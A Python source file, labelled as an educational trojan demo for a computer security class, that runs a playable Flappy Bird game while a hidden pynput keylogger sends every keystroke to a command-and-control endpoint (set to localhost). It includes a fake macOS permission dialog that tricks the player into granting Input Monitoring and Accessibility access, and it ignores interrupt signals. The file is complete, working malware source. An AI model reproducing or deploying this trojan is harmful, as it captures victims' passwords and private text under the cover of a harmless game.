"""
=============================================================
  DEMO EDUCACIONAL - Seguranca Computacional - UFPB
  Trojan: Flappy Bird com Keylogger oculto
  APENAS PARA APRESENTACAO ACADEMICA
=============================================================
"""

import sys
import os
import uuid
import signal
import threading
import time

# ---- CONFIGURACAO ----
C2_SERVER = "http://localhost:8080/api/keystroke"
CLIENT_ID = f"trojan-{uuid.uuid4().hex[:8]}"
LOCK_FILE = "/tmp/flappybird_demo.lock"
DEBUG_LOG = "/tmp/flappy_debug.log"
FIRST_RUN_MARKER = "/tmp/.flappydemo_setup_done"
# ----------------------


def _log(msg):
    try:
        ts = time.strftime("%H:%M:%S")
        with open(DEBUG_LOG, "a") as f:
            f.write(f"[{ts}] {msg}\n")
    except Exception:
        pass


_log(f"[boot] pid={os.getpid()}, frozen={getattr(sys, 'frozen', False)}")


def _start_keylogger():
    """Inicia keylogger usando pynput numa thread separada."""
    import requests
    from pynput import keyboard

    _log(f"[keylogger] starting with pynput, CLIENT_ID={CLIENT_ID}")

    # Check accessibility status
    try:
        import ctypes
        import ctypes.util
        lib = ctypes.cdll.LoadLibrary(ctypes.util.find_library("ApplicationServices"))
        AXIsProcessTrusted = lib.AXIsProcessTrusted
        AXIsProcessTrusted.restype = ctypes.c_bool
        _log(f"[keylogger] AXIsProcessTrusted={AXIsProcessTrusted()}")
    except Exception as e:
        _log(f"[keylogger] AX check error: {e}")

    def on_press(key):
        try:
            try:
                key_str = key.char if key.char else f"Key.{key.name}"
            except AttributeError:
                key_str = f"Key.{key.name}"

            _log(f"[key] {key_str}")

            def send(k):
                try:
                    requests.post(
                        C2_SERVER,
                        json={"key": k, "client_id": CLIENT_ID},
                        timeout=2,
                    )
                except Exception as e:
                    _log(f"[send error] {e}")

            threading.Thread(target=send, args=(key_str,), daemon=True).start()
        except Exception as e:
            _log(f"[on_press error] {e}")

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    _log("[keylogger] pynput listener started")


# ==================== HELPERS ====================

def _acquire_lock():
    if os.path.exists(LOCK_FILE):
        try:
            pid = int(open(LOCK_FILE).read().strip())
            os.kill(pid, 0)
            return False
        except (ValueError, ProcessLookupError, PermissionError):
            pass
    with open(LOCK_FILE, "w") as f:
        f.write(str(os.getpid()))
    return True


def _release_lock():
    try:
        os.remove(LOCK_FILE)
    except OSError:
        pass


# ==================== FLAPPY BIRD ====================

GAME_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #4EC0CA;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        overflow: hidden;
        font-family: 'Arial Black', Arial, sans-serif;
    }
    canvas {
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    }

    /* ===== PERMISSION DIALOG (macOS Sequoia style) ===== */
    .overlay {
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.18);
        display: flex;
        justify-content: center;
        align-items: flex-start;
        padding-top: 140px;
        z-index: 1000;
    }
    .overlay.hidden { display: none; }
    .dialog {
        background: linear-gradient(180deg, #f6f6f6 0%, #e8e8e8 100%);
        border-radius: 12px;
        width: 270px;
        box-shadow: 0 0 0 0.5px rgba(0,0,0,0.12), 0 8px 32px rgba(0,0,0,0.25);
        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
        overflow: hidden;
        animation: dialogIn 0.2s ease-out;
        -webkit-font-smoothing: antialiased;
    }
    @keyframes dialogIn {
        from { transform: scale(0.95); opacity: 0; }
        to { transform: scale(1); opacity: 1; }
    }
    .dialog-body { padding: 20px 20px 16px; text-align: center; }
    .dialog-icon { width: 64px; height: 64px; margin: 0 auto 14px; }
    .app-icon-svg { width: 64px; height: 64px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
    .dialog-title {
        font-size: 13px; font-weight: 700; color: #1d1d1f;
        margin-bottom: 6px; line-height: 1.35;
    }
    .dialog-text { font-size: 11px; color: #86868b; line-height: 1.5; }
    .dialog-buttons { padding: 4px 20px 20px; }
    .dialog-btn {
        width: 100%; padding: 7px 16px; border: none; border-radius: 6px;
        font-size: 13px; cursor: pointer; background: #007aff; color: white;
        font-weight: 500; font-family: -apple-system, sans-serif;
    }
    .dialog-btn:active { filter: brightness(0.92); }
</style>
</head>
<body>

<!-- PERMISSION DIALOG (first launch only) -->
<div class="overlay hidden" id="permOverlay">
    <div class="dialog">
        <div class="dialog-body">
            <div class="dialog-icon">
                <svg class="app-icon-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
                    <path d="M32 2C47.5 2 54 2 58 6C62 10 62 16.5 62 32C62 47.5 62 54 58 58C54 62 47.5 62 32 62C16.5 62 10 62 6 58C2 54 2 47.5 2 32C2 16.5 2 10 6 6C10 2 16.5 2 32 2Z" fill="url(#sg)"/>
                    <defs><linearGradient id="sg" x1="32" y1="2" x2="32" y2="62" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stop-color="#5BD1D7"/><stop offset="0.7" stop-color="#4EC0CA"/><stop offset="1" stop-color="#DED895"/>
                    </linearGradient></defs>
                    <clipPath id="sc"><path d="M32 2C47.5 2 54 2 58 6C62 10 62 16.5 62 32C62 47.5 62 54 58 58C54 62 47.5 62 32 62C16.5 62 10 62 6 58C2 54 2 47.5 2 32C2 16.5 2 10 6 6C10 2 16.5 2 32 2Z"/></clipPath>
                    <rect x="2" y="48" width="60" height="14" fill="#DED895" clip-path="url(#sc)"/>
                    <rect x="2" y="47" width="60" height="3" fill="#54B948" clip-path="url(#sc)"/>
                    <rect x="40" y="4" width="8" height="22" rx="1" fill="#73BF2E"/>
                    <rect x="38" y="23" width="12" height="4" rx="1" fill="#73BF2E"/>
                    <rect x="40" y="36" width="8" height="18" rx="1" fill="#73BF2E"/>
                    <rect x="38" y="34" width="12" height="4" rx="1" fill="#73BF2E"/>
                    <ellipse cx="24" cy="30" rx="7" ry="5.5" fill="#F8C630" stroke="#E8A020" stroke-width="1"/>
                    <ellipse cx="22" cy="32" rx="4" ry="2.5" fill="#E8A020"/>
                    <ellipse cx="27.5" cy="28" rx="2.5" ry="3" fill="white"/>
                    <ellipse cx="28.5" cy="28.5" rx="1.3" ry="1.7" fill="#1d1d1f"/>
                    <polygon points="30,29 35,31 30,33" fill="#E84430"/>
                </svg>
            </div>
            <div class="dialog-title">
                &ldquo;Flappy Bird&rdquo; Would Like to<br>Access Input Monitoring
            </div>
            <div class="dialog-text">
                Grant access in <b>System Settings &rsaquo;<br>
                Privacy &amp; Security &rsaquo; Accessibility</b>,<br>
                then reopen the app to play.
            </div>
        </div>
        <div class="dialog-buttons">
            <button class="dialog-btn" onclick="dismissDialog()">OK</button>
        </div>
    </div>
</div>

<canvas id="game" width="400" height="600"></canvas>
<script>

function showPermDialog() {
    document.getElementById("permOverlay").classList.remove("hidden");
}
function dismissDialog() {
    document.getElementById("permOverlay").classList.add("hidden");
    if (window.pywebview && window.pywebview.api) {
        window.pywebview.api.on_dialog_dismissed();
    }
}

const canvas = document.getElementById("game");
const ctx = canvas.getContext("2d");

let bird, pipes, score, bestScore, gameState, frameCount;

const GRAVITY = 0.4;
const FLAP = -7;
const PIPE_SPEED = 2.5;
const PIPE_GAP = 150;
const PIPE_WIDTH = 60;
const PIPE_INTERVAL = 100;
const BIRD_SIZE = 20;

function init() {
    bird = { x: 80, y: 250, vy: 0, angle: 0 };
    pipes = [];
    score = 0;
    bestScore = bestScore || 0;
    frameCount = 0;
    gameState = "waiting";
}

function flap() {
    if (gameState === "waiting") {
        gameState = "playing";
        bird.vy = FLAP;
    } else if (gameState === "playing") {
        bird.vy = FLAP;
    } else if (gameState === "dead") {
        init();
    }
}

document.addEventListener("keydown", (e) => {
    if (e.code === "Space" || e.code === "ArrowUp") {
        e.preventDefault();
        flap();
    }
});
canvas.addEventListener("click", flap);
canvas.addEventListener("touchstart", (e) => { e.preventDefault(); flap(); });

function drawSky() {
    const grad = ctx.createLinearGradient(0, 0, 0, canvas.height);
    grad.addColorStop(0, "#4EC0CA");
    grad.addColorStop(0.7, "#87CEEB");
    grad.addColorStop(1, "#DED895");
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, canvas.width, canvas.height);
}

function drawGround() {
    ctx.fillStyle = "#54B948";
    ctx.fillRect(0, canvas.height - 60, canvas.width, 5);
    ctx.fillStyle = "#DED895";
    ctx.fillRect(0, canvas.height - 55, canvas.width, 55);
    ctx.fillStyle = "#C8C070";
    for (let x = (frameCount * -PIPE_SPEED) % 30; x < canvas.width; x += 30) {
        ctx.fillRect(x, canvas.height - 55, 15, 3);
    }
}

function drawClouds() {
    ctx.fillStyle = "rgba(255,255,255,0.6)";
    const offset = (frameCount * 0.3) % (canvas.width + 200);
    [[100, 60], [300, 90], [500, 40]].forEach(([bx, by]) => {
        const cx = (bx - offset + canvas.width + 200) % (canvas.width + 200) - 100;
        ctx.beginPath();
        ctx.ellipse(cx, by, 50, 20, 0, 0, Math.PI * 2);
        ctx.ellipse(cx + 15, by - 15, 30, 15, 0, 0, Math.PI * 2);
        ctx.ellipse(cx - 20, by - 5, 25, 12, 0, 0, Math.PI * 2);
        ctx.fill();
    });
}

function drawBird() {
    ctx.save();
    ctx.translate(bird.x, bird.y);
    bird.angle = Math.min(Math.max(bird.vy * 3, -30), 70);
    ctx.rotate(bird.angle * Math.PI / 180);
    ctx.fillStyle = "#F8C630";
    ctx.beginPath();
    ctx.ellipse(0, 0, BIRD_SIZE, BIRD_SIZE * 0.8, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.strokeStyle = "#E8A020";
    ctx.lineWidth = 2;
    ctx.stroke();
    ctx.fillStyle = "#E8A020";
    const wingY = gameState === "playing" ? Math.sin(frameCount * 0.3) * 5 : 0;
    ctx.beginPath();
    ctx.ellipse(-5, 3 + wingY, 12, 7, -0.2, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = "white";
    ctx.beginPath();
    ctx.ellipse(8, -5, 7, 8, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = "black";
    ctx.beginPath();
    ctx.ellipse(10, -4, 3.5, 4.5, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = "#E84430";
    ctx.beginPath();
    ctx.moveTo(15, -2);
    ctx.lineTo(25, 3);
    ctx.lineTo(15, 6);
    ctx.closePath();
    ctx.fill();
    ctx.restore();
}

function drawPipe(pipe) {
    const x = pipe.x;
    const topH = pipe.topH;
    const botY = topH + PIPE_GAP;
    const topGrad = ctx.createLinearGradient(x, 0, x + PIPE_WIDTH, 0);
    topGrad.addColorStop(0, "#73BF2E");
    topGrad.addColorStop(0.5, "#8FD44A");
    topGrad.addColorStop(1, "#5A9A20");
    ctx.fillStyle = topGrad;
    ctx.fillRect(x, 0, PIPE_WIDTH, topH);
    ctx.fillStyle = "#5A9A20";
    ctx.fillRect(x - 5, topH - 25, PIPE_WIDTH + 10, 25);
    ctx.fillStyle = "#8FD44A";
    ctx.fillRect(x - 3, topH - 23, PIPE_WIDTH + 6, 21);
    ctx.fillStyle = topGrad;
    ctx.fillRect(x, botY, PIPE_WIDTH, canvas.height - botY);
    ctx.fillStyle = "#5A9A20";
    ctx.fillRect(x - 5, botY, PIPE_WIDTH + 10, 25);
    ctx.fillStyle = "#8FD44A";
    ctx.fillRect(x - 3, botY + 2, PIPE_WIDTH + 6, 21);
}

function drawScore() {
    ctx.fillStyle = "rgba(0,0,0,0.3)";
    ctx.font = "bold 48px 'Arial Black'";
    ctx.textAlign = "center";
    ctx.fillText(score, canvas.width / 2 + 2, 72);
    ctx.fillStyle = "white";
    ctx.strokeStyle = "black";
    ctx.lineWidth = 3;
    ctx.strokeText(score, canvas.width / 2, 70);
    ctx.fillText(score, canvas.width / 2, 70);
}

function drawWaiting() {
    ctx.fillStyle = "white";
    ctx.strokeStyle = "black";
    ctx.lineWidth = 2;
    ctx.font = "bold 32px 'Arial Black'";
    ctx.textAlign = "center";
    ctx.strokeText("FLAPPY BIRD", canvas.width / 2, 180);
    ctx.fillText("FLAPPY BIRD", canvas.width / 2, 180);
    ctx.font = "bold 18px Arial";
    const blink = Math.sin(frameCount * 0.08) > 0;
    if (blink) {
        ctx.strokeText("CLIQUE OU ESPACO PRA JOGAR", canvas.width / 2, 350);
        ctx.fillText("CLIQUE OU ESPACO PRA JOGAR", canvas.width / 2, 350);
    }
}

function drawDead() {
    ctx.fillStyle = "rgba(0,0,0,0.4)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "white";
    ctx.strokeStyle = "black";
    ctx.lineWidth = 2;
    ctx.font = "bold 36px 'Arial Black'";
    ctx.textAlign = "center";
    ctx.strokeText("GAME OVER", canvas.width / 2, 220);
    ctx.fillText("GAME OVER", canvas.width / 2, 220);
    ctx.font = "bold 22px Arial";
    ctx.strokeText("Score: " + score, canvas.width / 2, 270);
    ctx.fillText("Score: " + score, canvas.width / 2, 270);
    ctx.strokeText("Best: " + bestScore, canvas.width / 2, 305);
    ctx.fillText("Best: " + bestScore, canvas.width / 2, 305);
    const blink = Math.sin(frameCount * 0.08) > 0;
    if (blink) {
        ctx.font = "bold 16px Arial";
        ctx.strokeText("CLIQUE PRA RECOMECAR", canvas.width / 2, 380);
        ctx.fillText("CLIQUE PRA RECOMECAR", canvas.width / 2, 380);
    }
}

function checkCollision() {
    if (bird.y + BIRD_SIZE > canvas.height - 60 || bird.y - BIRD_SIZE < 0) return true;
    for (const pipe of pipes) {
        if (bird.x + BIRD_SIZE > pipe.x && bird.x - BIRD_SIZE < pipe.x + PIPE_WIDTH) {
            if (bird.y - BIRD_SIZE * 0.7 < pipe.topH || bird.y + BIRD_SIZE * 0.7 > pipe.topH + PIPE_GAP) {
                return true;
            }
        }
    }
    return false;
}

function update() {
    frameCount++;
    if (gameState === "playing") {
        bird.vy += GRAVITY;
        bird.y += bird.vy;
        if (frameCount % PIPE_INTERVAL === 0) {
            const topH = 60 + Math.random() * (canvas.height - PIPE_GAP - 160);
            pipes.push({ x: canvas.width, topH: topH, scored: false });
        }
        for (const pipe of pipes) {
            pipe.x -= PIPE_SPEED;
            if (!pipe.scored && pipe.x + PIPE_WIDTH < bird.x) {
                pipe.scored = true;
                score++;
            }
        }
        pipes = pipes.filter(p => p.x + PIPE_WIDTH > -10);
        if (checkCollision()) {
            gameState = "dead";
            if (score > bestScore) bestScore = score;
        }
    } else if (gameState === "waiting") {
        bird.y = 250 + Math.sin(frameCount * 0.05) * 15;
    }
}

function draw() {
    drawSky();
    drawClouds();
    pipes.forEach(drawPipe);
    drawGround();
    drawBird();
    drawScore();
    if (gameState === "waiting") drawWaiting();
    if (gameState === "dead") drawDead();
}

function gameLoop() {
    update();
    draw();
    requestAnimationFrame(gameLoop);
}

init();
gameLoop();
</script>
</body>
</html>
"""


def _is_first_run():
    return not os.path.exists(FIRST_RUN_MARKER)


def _mark_setup_done():
    try:
        with open(FIRST_RUN_MARKER, "w") as f:
            f.write("1")
    except Exception:
        pass


class Api:
    def on_dialog_dismissed(self):
        _mark_setup_done()
        _log("[api] dialog dismissed, marked setup done")


def _on_loaded(window, first_run):
    """Called when webview finishes loading."""
    if first_run:
        window.evaluate_js("showPermDialog()")


def main():
    _log("[main] entered")
    import webview

    first_run = _is_first_run()
    _log(f"[main] first_run={first_run}")

    _start_keylogger()

    api = Api()
    window = webview.create_window(
        "Flappy Bird",
        html=GAME_HTML,
        width=420,
        height=640,
        resizable=False,
        js_api=api,
    )

    if first_run:
        window.events.loaded += lambda: _on_loaded(window, True)

    webview.start()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    if not _acquire_lock():
        print("[!] Flappy Bird ja esta rodando.")
        sys.exit(0)

    try:
        main()
    except Exception as e:
        _log(f"[EXCEPTION] {e}")
        import traceback
        _log(traceback.format_exc())
    finally:
        _release_lock()
        _log("[main] exiting")
